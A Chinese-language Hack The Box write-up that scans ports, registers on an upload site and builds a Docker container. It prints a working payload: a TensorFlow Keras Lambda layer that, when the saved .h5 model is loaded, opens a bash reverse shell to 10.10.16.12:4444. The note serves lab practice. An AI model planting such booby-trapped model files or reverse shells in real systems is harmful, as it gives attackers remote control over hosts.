---
UID: 20250625221450
aliases: 
tags:
  - 靶场
  - 打靶
  - hackthebox
source: 
cssclasses: 
created: 2025-06-25
---

![image.png](https://s2.loli.net/2025/06/25/NwqWm8xZ6d5ujEV.png)

## 扫描端口
![image.png](https://s2.loli.net/2025/06/25/iSgMrtOyNxWvHQC.png)

有 ssh 服务和 web 服务

## web 服务信息收集
其实有个登录界面，我们注册一个号进去
![image.png](https://s2.loli.net/2025/06/25/foSEg1Nj5bvFUQM.png)

是个上传界面，本想改编一下 dockerfile 上传进去，看了 wp 发现不是这样
![image.png](https://s2.loli.net/2025/06/25/topXOJ5PmHunisd.png)


是下载 dockerfile 在本地构建一个容器
```
docker build -t my-image .


```
![image.png](https://s2.loli.net/2025/06/25/kByJOrH5pju1Iax.png)

![image.png](https://s2.loli.net/2025/06/25/osamNXhvPVr96Tx.png)

是用了tensorflow 的反弹 shell，在 docker 容器中刚好有环境，跑这个代码就能获得反弹 shell 的 h 5 文件
```
import tensorflow as tf
import os
 
def exploit(x):
    import os
    os.system("/bin/bash -i >& /dev/tcp/10.10.16.12/4444 0>&1")
    return x
 
model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("model.h5")

```

![image.png](https://s2.loli.net/2025/06/27/IkcBMLxP8GewTia.png)

用 docker 命令复制出来
```
docker cp c80b77eedae5:/code/exploit.h5 /home/kali/下载/test
```

![image.png](https://s2.loli.net/2025/06/27/aj5YlCJF2rnm1Gz.png)

![image.png](https://s2.loli.net/2025/06/27/eM8WJGDoONyqC6T.png)
